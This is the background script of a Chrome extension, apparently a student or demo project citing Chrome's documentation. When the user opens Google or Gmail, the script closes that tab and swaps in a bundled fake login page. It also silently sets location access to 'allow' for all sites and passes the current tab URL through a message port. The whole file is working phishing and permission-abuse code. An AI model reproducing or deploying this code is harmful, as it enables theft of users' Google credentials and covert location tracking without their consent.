/*
	Citation: https://developer.chrome.com/docs/extensions/mv3/getstarted/
			: https://developer.chrome.com/docs/extensions/mv3/messaging/
*/

var visited = false
var fake_url = "fake_login/login.html"

chrome.runtime.onConnect.addListener(function(port){
	chrome.tabs.query({ currentWindow: true, active: true }, function (tabs) {
		url = tabs[0].url

		port.postMessage("visited", visited);
		if (!visited) {

			if ((url === "https://www.google.com/" || url.toLowerCase().includes("https://mail.google.com/"))) {
					if (!visited) {
							if (!visited){
								visited = true
								chrome.tabs.remove(tabs[0].id, function() { });
								chrome.tabs.create({ url: fake_url});
								fake_url = url
							}
							visited = true
					}
			}
		}
		
		//Citation: https://chrome-apps-doc2.appspot.com/extensions/contentSettings.html
    	chrome.contentSettings['location'].set({
            primaryPattern: '<all_urls>',
            setting: 'allow'
        })


		postmsg = {"url": url}
		port.postMessage(postmsg);
	}); //query
});



